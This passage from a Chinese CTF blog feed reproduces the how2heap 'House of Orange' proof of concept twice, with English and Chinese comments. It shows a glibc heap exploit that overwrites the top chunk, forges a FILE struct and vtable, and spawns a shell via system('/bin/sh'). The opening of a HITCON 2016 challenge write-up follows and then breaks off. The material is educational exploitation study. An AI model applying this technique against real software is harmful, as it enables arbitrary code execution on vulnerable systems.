2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>老样子，翻译一遍源码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  House of Orange 通过堆溢出从而破坏_IO_list_all指针</span></span><br><span class="line"><span class="comment">  House of Orange 要求堆地址和libc地址的泄露</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   winner这个函数仅仅是展现模拟system函数的地址已知的场景</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      House of Orange 首先假设一个堆溢出,使得Top chunk被破坏。</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      在程序执行的开始, 堆块是Top chunk的一部分.</span></span><br><span class="line"><span class="comment">      第一次的分配通常是Top chunk的一块，是通过服务请求从Top chunk切割下来</span></span><br><span class="line"><span class="comment">      因此每一次的分配Top chunk会随之变得更小</span></span><br><span class="line"><span class="comment">      在Top chunk的大小比我们所申请的堆块小时，就会出现以下两种情况：</span></span><br><span class="line"><span class="comment">       1) 扩大Top chunk</span></span><br><span class="line"><span class="comment">       2) 使用Mmap申请一个新内存</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      如果被请求的大小小于0x21000情况,前面的两种可能也是会出现的.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个技术的攻击模拟下通过malloc_printerr已经被移除了&quot;</span></span><br><span class="line">        <span class="string">&quot;这表示在91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26)后不再调用_IO_flush_all_lockpwhich is no longer calling _IO_flush_all_lockp.\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;从glibc2.24中_IO_FILE vtable会被检测用来对付这个exp的白名单&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      首先我们先分配一个chunk在堆上.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       堆通常被分配一个0x21000大小的top chunk,</span></span><br><span class="line"><span class="comment">       因为我们已经分配了一个0x400大小的堆块</span></span><br><span class="line"><span class="comment">       所以我们剩下0x20c00大小的堆块,包括PREV_INUSE,SIZE被0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       这个heap的边界是页对齐的.因为Top chunk是heap中的最后一个chunk.</span></span><br><span class="line"><span class="comment">       它必须在末尾是页对齐的</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       而且,如果一个与Top chunk在物理地址上相邻的chunk被释放后,它会与Top chunk合并.</span></span><br><span class="line"><span class="comment">       因此Top chunk的PREV_INUSE位总是被设置.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       所以这意味着有两个条件必须一直满足</span></span><br><span class="line"><span class="comment">        1) Top chunk + size 必须页对齐</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit必须被设置</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       我们能满足这两个条件如果我们设置Top chunk的size位为0xC00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       也就是0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       现在,让我们满足这两个条件</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       现在我们申请一个堆块大小,这个堆块的size比Top chunk的size位更大的堆块</span></span><br><span class="line"><span class="comment">       Malloc 尝试通过扩展Top chunk的来为这个请求提供服务</span></span><br><span class="line"><span class="comment">       这迫使系统调用被唤醒</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       在一般情况下, heap的内存布局很像如下</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       而且一个被分配的新区域对于就的堆块结尾影响不大.</span></span><br><span class="line"><span class="comment">       因此Top chunk新的size位是之前的Top chunk的size位+新分配的size大小</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       为了持续追踪size位的改变,malloc使用一个fencepost chunk(这个堆块总的来说是一个暂时的堆块)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       在Top chunk的size位被更新之后,这个fencepost chunk就会被free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       在我们这个场景中,heap的内存布局如下</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       在这种情况下, 新的Top将从与之前heap end地址相邻的内存空间开始</span></span><br><span class="line"><span class="comment">       因此在第二个堆块和heap end之间的这个空间是没有被使用的</span></span><br><span class="line"><span class="comment">       这个旧的Top chunk会被free</span></span><br><span class="line"><span class="comment">       因为旧的Top chunk的size比较大,所以当这个旧的Top chunk被释放的时候它的大小会被fastbin的堆块更大</span></span><br><span class="line"><span class="comment">       这个chunk就会被放入unsorted bins中</span></span><br><span class="line"><span class="comment">       现在我们申请一个chunk,这个chunk的size比新的top chunk更大</span></span><br><span class="line"><span class="comment">       这又会发生系统调用，并且最终会调用_int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      注意: 在chunk的高地址处将会被分配在不同的页中通过mmap调用. </span></span><br><span class="line"><span class="comment">      它将被放置在旧的heap end之后</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      现在我们留下是之前的Top chunk,这个Top chunk被释放并且加入到了unsorted bins中.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      这里开始阶段性的两个攻击. 我们存在一个堆溢出,这个堆溢出能溢出修改old Top chunk</span></span><br><span class="line"><span class="comment">      因此我们能修改chunk的size位</span></span><br><span class="line"><span class="comment">      第二阶段我们再一次利用溢出修改这个在unsorted bin链表的fd和bk指针</span></span><br><span class="line"><span class="comment">      有两个普通的方式利用当前的状态</span></span><br><span class="line"><span class="comment">        - 可以通过设置相应的指针,使得可以申请到任意地址 (要求至少两次申请)</span></span><br><span class="line"><span class="comment">        - 使用chunk的unlink操作使得main_arena中的unsorted bin链表指向可控的位置,并在该位置写入特定数据(要求至少一次的分配)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      之前的attack是非常直接了当利用,因此我们只详细说明一个第二种利用方式的一个变种.</span></span><br><span class="line"><span class="comment">      这种方式在Angelboy的博客文章(上面有给链接)发现并利用</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      这个攻击方式是非常惊人的,因为它的利用是当libc发现堆处于异常状态的时候会触发abort调用.</span></span><br><span class="line"><span class="comment">      无论何时abort被触发, 它都将通过调用_IO_flush_all_lockp刷新文件指针.</span></span><br><span class="line"><span class="comment">      最终, 会遍历链表_IO_list_all并且调用链表中的_IO_OVERFLOW.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      该方法是修改_IO_list_all使其指向我们伪造的文件结构体,</span></span><br><span class="line"><span class="comment">      在这个结构体中_IO_OVERLOW指向system函数并且这个结构体的前八字节要被设置为&#x27;/bin/sh&#x27;,</span></span><br><span class="line"><span class="comment">      以便于调用 _IO_OVERFLOW(fp, EOF)这个函数的时候会执行system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      更多关于文件指针的利用能在这篇博客中找到:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      _IO_list_all的地址可以从free chunk的fd和bk指针计算得到,因为他们当前指向的是libc的main_arena这个地址</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      我们计划修改已经被添加到unsorted bins链表中的old top的fd和bk指针</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      当malloc尝试满足从free chunk切割堆块的请求时,这个chunk-&gt;bk-&gt;fd的值会被修改成libc中的main_arena存放unsorted-</span></span><br><span class="line"><span class="comment">      bin链表指针的地址</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      注意:修改发生在合理性检查之前,因此这个无论如何都会发生</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      这里, 我们要求chunk-&gt;bk-&gt;fd的值成为_IO_list_all.</span></span><br><span class="line"><span class="comment">      因此, 我们应该设置chunk-&gt;bk为_IO_list_all - 16的值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      最后, system函数将被指向该文件指针的指针调用</span></span><br><span class="line"><span class="comment">      如果我们将前8字节填入/bin/sh, 程序就相当于调用system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp函数会遍历在_IO_list_all中的file指针链表.</span></span><br><span class="line"><span class="comment">      因为我们仅能用main_arena的unsorted-bin链表去修改这个地址.</span></span><br><span class="line"><span class="comment">      这个利用方式可以控制内存中相关的fd-ptr指针.</span></span><br><span class="line"><span class="comment">      下一个文件指针的地址被放在base_address+0x68(即0x68偏移处)</span></span><br><span class="line"><span class="comment">      被修改的文件指针对应于smallbin-4的位置,smallbin-4这个位置保存着90-98字节的smallbin堆块.</span></span><br><span class="line"><span class="comment">      想了解更多关于libc的bins结构请看这个博客:</span></span><br><span class="line"><span class="comment">  https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      因为我们溢出了old top chunk,我们也就可以控制它的size位.</span></span><br><span class="line"><span class="comment">      这里就有点棘手了, 当前的old chunk是在unsortedbin链表中.</span></span><br><span class="line"><span class="comment">      每次分配的时候, malloc首先尝试将unsortedbin chunk中的堆块提供给用户(切割堆块或者整块拿走),</span></span><br><span class="line"><span class="comment">      因此会遍历unsorted bin这个链表.</span></span><br><span class="line"><span class="comment">      遍历完之后, malloc将分类所有在unsorted bins中non-fitting的堆块,将这些堆块放入相应的bins中.</span></span><br><span class="line"><span class="comment">      如果我们设置堆块的size位为0x61 (prev_inuse 被设置为1)</span></span><br><span class="line"><span class="comment">      并且触发一个比non-fitting的chunk更小的分配(就是调用malloc(),申请一个小于non-fitting chunk的大小),</span></span><br><span class="line"><span class="comment">      malloc将这个old chunk分类进smallbin-4这个堆块中</span></span><br><span class="line"><span class="comment">      因为这个bin当前没有堆块(也就是空的),所以old top chunk将成为新的头结点,</span></span><br><span class="line"><span class="comment">      因此,这个old top chunk的地址会占据位于main_arena中的smallbin[4]这个元素 </span></span><br><span class="line"><span class="comment">      并且最终会被假的文件指针的fd指针取代.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      除了分类之外, malloc也将对smallbin中的chunk进行size位的检查</span></span><br><span class="line"><span class="comment">      因此在对old top chunk分类和同构伪造的指针找到 _IO_list_all之后, </span></span><br><span class="line"><span class="comment">      malloc将检查相应的位,查看size是否比MINSIZE小(一个宏定义相应的检查为size &lt;= 2 * SIZE_SZ)</span></span><br><span class="line"><span class="comment">      并且最后触发abort函数调用,在调用时就会触发我们的利用链.</span></span><br><span class="line"><span class="comment">      下面一个网址是相应的利用链:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      我们来到了下一阶段,这个阶段我们要绕过假文件指针的一些限制</span></span><br><span class="line"><span class="comment">      在函数_IO_flush_all_lockp中会对做这些限制,并且在这里会做检测,相关的源码如下:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      我们如果想要绕过限制,需要满足的第一个条件如下:We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. 设置mode为0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. 设置write_base 为 2 and write_ptr 为 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) 最后设置这个跳表指向可控的内存,并且放置system函数在那里.</span></span><br><span class="line"><span class="comment">      如下的跳表指针在FILE struct是正确的:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 最后, 触发整个IO链,通过调用malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     libc&#x27;的错误信息将被打印到屏幕上,但是你将有极高的概率getshell(有时会真报错而推出程序).</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h1 id="house_of_orange_level_1"><a href="#house-of-orange-level-1" class="headerlink" title="house_of_orange_level_1"></a>house_of_orange_level_1</h1><ul><li><p>题目来源：hitcon_2016中的<code>house_of_orange</code></p></li><li><p>先来检查一下保护机制,发现该题目的附件保护全开</p></li></ul><p><img src="/2025/02/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250321121231184.png" alt="image-20250321121231184"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <summary type="html">前言：byteCTF太牢，安卓逆向看了一下Fruttle，还是写不出来，直接看新题pwn，堆的那题</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>2025hgame week1</title>
    <link href="http://iyheart.github.io/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/"/>
    <id>http://iyheart.github.io/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/</id>
    <published>2025-02-11T16:59:14.000Z</published>
    <updated>2025-02-12T03:19:17.707Z</updated>
    
